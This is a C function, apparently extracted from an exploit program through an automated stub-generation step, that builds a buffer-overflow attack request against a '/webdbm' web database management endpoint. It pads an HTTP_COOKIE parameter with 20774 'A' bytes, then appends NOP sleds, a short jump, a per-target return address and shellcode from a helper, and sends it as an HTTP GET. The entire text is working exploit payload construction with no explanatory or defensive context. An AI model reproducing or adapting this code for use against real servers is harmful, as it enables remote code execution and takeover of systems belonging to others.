
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int fsh ;
struct TYPE_2__ {int ret; } ;


 int memcpy (unsigned char*,...) ;
 int memset (unsigned char*,char,int) ;
 int prepare_shellcode (unsigned char*,unsigned int*,int) ;
 unsigned int strlen (char*) ;
 TYPE_1__* targets ;

void make_buffer(unsigned char * buf, int itarget, int sh)
{

 unsigned char fsh[10000];
 unsigned int fshlength;
 memset(fsh, 0, sizeof(fsh));
 prepare_shellcode(fsh, &fshlength, sh);



 unsigned char * cp=buf;


 memcpy(cp, "GET /webdbm?Event=DBM_INTERN_TEST&Action=REFRESH&HTTP_COOKIE=", strlen("GET /webdbm?Event=DBM_INTERN_TEST&Action=REFRESH&HTTP_COOKIE="));
 cp +=strlen((char *)cp);


 memset(cp, 'A', 20774);
 cp +=strlen((char *)cp);


 *cp++ = '\x90';
 *cp++ = '\x90';
 *cp++ = '\xEB';
 *cp++ = '\x06';



 *cp++ = (char)((targets[itarget].ret ) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 8) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 24) & 0xff);


 *cp++ = '\x90';
 *cp++ = '\x90';
 *cp++ = '\x90';
 *cp++ = '\x90';


 memcpy(cp, fsh, fshlength);
 cp+=fshlength;


 memcpy(cp, " HTTP/1.0\r\n\r\n", strlen(" HTTP/1.0\r\n\r\n"));
 cp +=strlen((char *)cp);

}
